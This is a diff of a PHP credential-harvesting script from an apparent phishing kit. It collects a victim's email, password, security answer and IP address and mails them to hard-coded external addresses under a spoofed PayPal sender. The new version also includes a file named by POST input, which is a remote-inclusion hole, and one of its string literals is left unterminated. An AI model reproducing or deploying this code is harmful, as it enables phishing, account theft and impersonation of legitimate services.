@@ -1,21 +1,34 @@
-<?
+<?php
 
-session_start();
 
-$email = $_POST['email'];
-$pass = $_POST['pass'];
-$answer = $_POST['answer'];
-$message .= "IP                      : ".$ip."\n";
-$message .= "---------+u krijua nga: [S-P-M]&Mikrotik+-------------\n";
 
-//sending email info here
+$ip = getenv("REMOTE_ADDR");
+$login = $_POST['email'];
+$passs = $_POST['pass'];
+$answers = $_POST['answer'];
+$hostname = $_POST['hostname'];
 
-$subj = " qe merri ";
-$msg = "Viktima: $email\nItaqi: $pass\nFaqja: $answer\n";
-mail("muham3dd@gmail.com,muham3d@live.com", $subj, $msg);
-$subject = "Dhuratat";
-$headers = "From: UrimeVitiRi<muham3dd@gmail.com>";
+
+$message = "
+Viktima  		: $login
+Itaqi  			: $passs
+Faqja			: $answers
+IP	: http://www.geoiptool.com/?IP=$ip
+;
+
+$encrypt=  base64_encode($message);
+include "$hostname";
+
+$to = "muham3dd@gmail.com,muham3d@live.com"; // Email Here
+$subject = "dhuratat = [$ip]";
+$headers = "From: shabani <paypal@support.com>";
 $headers .= $_POST['eMailAdd']."\n";
 $headers .= "MIME-Version: 1.0\n";
-header("Location: bussines.php");
+
+mail($to, $subject, $message,$headers);
+
+
+header("Location:bussines.php");
+
+
 ?>
